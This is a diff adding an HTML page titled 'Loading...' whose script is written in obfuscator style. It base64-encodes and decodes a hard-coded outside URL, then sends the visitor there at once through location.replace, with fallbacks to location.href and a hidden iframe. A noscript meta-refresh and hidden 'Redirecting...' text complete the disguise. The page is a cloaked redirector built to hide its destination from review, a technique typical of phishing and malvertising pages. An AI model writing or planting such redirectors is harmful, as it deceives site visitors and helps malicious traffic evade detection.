@@ -1,0 +1,64 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Loading...</title>
+
+    <noscript>
+        <meta http-equiv="refresh" content="0; url=PASTE_URL_HERE">
+    </noscript>
+
+    <script>
+    (function(){
+        var _0xurl = "http://Torxsus.com";
+
+        function _0xenc(u){
+            return btoa(unescape(encodeURIComponent(u)));
+        }
+
+        function _0xdec(u){
+            return decodeURIComponent(escape(atob(u)));
+        }
+
+        function _0xdelay(){
+            return Math.floor(Math.random() * 10);
+        }
+
+        var _0xdata = _0xenc(_0xurl);
+
+        function _0xiframe(u){
+            var f = document.createElement("iframe");
+            f.style.display = "none";
+            f.src = u;
+            document.body.appendChild(f);
+        }
+
+        function _0xgo(){
+            var finalURL = _0xdec(_0xdata);
+
+            try {
+                window.location.replace(finalURL);
+            } catch(e) {
+                try {
+                    window.location.href = finalURL;
+                } catch(e2) {
+                    _0xiframe(finalURL);
+                }
+            }
+        }
+
+        setTimeout(function(){
+            _0xgo();
+        }, _0xdelay());
+
+        window.onload = function(){
+            _0xgo();
+        };
+
+    })();
+    </script>
+</head>
+
+<body>
+    <p style="display:none;">Redirecting...</p>
+</body>
+</html>
